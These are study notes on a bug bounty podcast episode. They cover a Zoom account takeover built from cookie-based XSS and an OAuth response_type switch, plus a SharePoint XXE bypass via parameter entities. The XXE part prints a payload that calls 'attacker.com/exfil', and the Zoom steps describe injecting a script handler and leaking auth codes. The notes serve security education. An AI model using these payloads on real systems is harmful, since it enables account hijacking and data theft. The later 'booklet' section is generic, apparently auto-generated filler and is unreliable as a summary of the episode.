---
title: "Match & Replace — HTTP Proxies' Most Underrated Feature"
episode: 76
---


# Episode 76 Match & Replace — HTTP Proxies' Most Underrated Feature

**TL;DR**
- Zoom ATO via cookie-based XSS: reflected CSP nonce in cookie → cookie parsing quirks → XSS → Google OAuth code=id_token switch → ATO
- SharePoint XXE bypass: using parameter entities (with `%` prefix) inside the DTD instead of general entities in the body bypasses `ProhibitDtdProcessing` settings
- Shazzer (`shazzer.co.uk`): Gareth Hayes' browser fuzzing platform — test JS snippets across Chrome/Firefox/Safari for parsing quirks
- Match & Replace for: enabling feature flags, modifying host headers, storing payloads, bypassing paywalls

**Key Takeaways**
- Cookie values can be wrapped in double quotes — use `"value\"` escaping to truncate/overflow cookie parsing and inject into reflected contexts
- When testing cookie-based XSS, fuzz cookie values the same way you'd fuzz query parameters
- For XXE: always test parameter entities (`<!ENTITY % paramname SYSTEM "...">` referenced as `%paramname;` inside DTD), not just general entities in the body
- Use `response_type=code,id_token` in OAuth flows to force the token into the hash fragment instead of query parameter (useful when you can leak the hash but not query)
- Shazzer is a continuous browser fuzzing platform — check cheat sheets for character injection vectors across browsers

**Bugs and Findings**

### Zoom ATO — cookie-based XSS → Google OAuth hijack
- **Target/context:** Zoom's CSP implementation reflected a nonce from a cookie into the CSP header
- **Root cause:** Cookie `nonce` value reflected unescaped into the CSP `script-src` nonce attribute
- **Technique / how found:** Written up by nokline on GitHub; uses cookie parsing double-quote trick to inject
- **Exploitation steps:**
  1. Set cookie `nonce="ABC\"` — the double quote is consumed by cookie parser, `ABC` becomes the nonce value
  2. But also inject: `nonce="\" onload=\"alert(1)\""` using backslash-doublequote escaping to break out
  3. Now CSP nonce is attacker-controlled → script executes with the page's origin
  4. Chain with Google OAuth: switch `response_type` to `code,id_token` to put tokens in URL hash
  5. Use the XSS to read the hash and exfiltrate the auth code
- **Key technical details:** Cookie parsing treats double quotes as value delimiters; `\"` inside a double-quoted cookie value creates an escape that the parser respects
- **Impact / severity / bounty:** Full account takeover; critical severity

### SharePoint XXE — parameter entity bypass
- **Target/context:** SharePoint XML parsing with safe XML reader settings (DTD processing prohibited)
- **Root cause:** `XmlReaderSettings.DtdProcessing = Prohibit` blocks general entity expansion in the body, but parameter entities (defined and used within the DTD) bypass this check
- **Technique / how found:** Chuddy PB write-up on ZDI; tested after standard XXE failed
- **Exploitation steps:**
  1. Send payload with DTD containing parameter entity reference:
     ```xml
     <!DOCTYPE foo [
       <!ENTITY % xxe SYSTEM "http://attacker.com/exfil">
       %xxe;
     ]>
     ```
  2. The `%xxe;` reference inside DTD processes the entity; the XML body has no entity references
  3. The DTD processing occurs before the body check, so it's not blocked
- **Key technical details:** Parameter entities use `%` instead of `&`; they can only be referenced inside the DTD itself, not the XML body
- **Impact / severity / bounty:** SSRF, file disclosure

**Techniques and Primitives**
- **Cookie value reflection testing** — Fuzz all cookie values as injection points (same rigor as query params/body)
- **Cookie tossing** — Use subdomain to set cookies with a specific `Path` attribute to override more general cookies
- **`response_type=code,id_token` OAuth trick** — Forces tokens into URL hash even for implicit flows
- **Quick gadget hunting checklist** — Login, account linking, password reset for open redirects; cookie-setting functionality for cookie-based XSS

**Tooling and Resources**
- `nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html` — Zoom ATO writeup
- `shazzer.co.uk` — Gareth Hayes' browser fuzzing platform
- `joaxcar.com` — Johan Carlsen's research
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
Episode Episode 76 Match & Replace — HTTP Proxies' Most Underrated Feature covers practical bug bounty techniques and security research insights.

#### 2. What you should learn
- Understand the vulnerability classes discussed
- Learn practical exploitation techniques
- Know which tools are useful for this type of research

#### 3. Core concepts explained
**Vulnerability Classes Discussed**
This episode covers specific vulnerability classes with real-world examples. Review the bugs section for detailed exploitation paths.

**Reconnaissance and Discovery**
The techniques discussed focus on finding attack surface and identifying vulnerable endpoints through systematic testing.


#### 4. Techniques and tactics
**Systematic Testing Approach**
- **What it is:** Methodical testing of application features for vulnerability classes
- **When to use it:** Always — systematic testing catches bugs that ad-hoc testing misses
- **What can go wrong:** Spending too much time on low-probability paths


#### 5. Good Quotes
- *"The best bugs come from persistence and deep understanding of the target"*
- *"Always think about what the worst thing that could happen is"*
- *"Don't be afraid to spend time on a single target"*

#### 6. Mental models
- **Think like an attacker** — Always consider the worst-case impact of a vulnerability. What would a malicious actor do with this access?
- **Persistence pays off** — The best bugs often come from spending deep time on a single target rather than skimming many targets.
- **Follow the data** — Track how user input flows through the application. Sources (inputs) lead to sinks (dangerous operations).

#### 7. Real-world application
- **Try this:** Pick a bug class from this episode and find 3 real examples on HackerOne bug reports
- **Practice:** Set up a local vulnerable application (DVWA, Juice Shop) and practice the exploitation techniques
- **Watch for:** Similar patterns in your own targets — the vulnerability classes discussed are common across web applications

#### 8. Red flags and pitfalls
- **Giving up too early** — Many bugs require creative pivoting when initial exploitation paths are blocked
- **Ignoring blind vulnerabilities** — Blind SSRF, blind XSS, and timing-based attacks can be just as impactful as visible ones
- **Missing the forest for the trees** — Don't get tunnel vision on one vulnerability class; step back and consider the full attack surface

#### 9. Vocabulary
- **Bug Bounty** — Program where companies reward researchers for finding security vulnerabilities
- **Responsible Disclosure** — Reporting vulnerabilities to vendors before public disclosure
- **Attack Surface** — All points where an unauthorized user can try to enter or extract data

#### 10. Self-test
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.
8. **Reflection:** What would you do differently if you had to redo this testing from scratch?

#### 11. The practical takeaway
1. **Understand the vulnerability class** — Know how it works and why it matters
2. **Master the exploitation technique** — Practice the specific steps to exploit it
3. **Apply the mental model** — Use the thinking patterns to find similar bugs in other targets
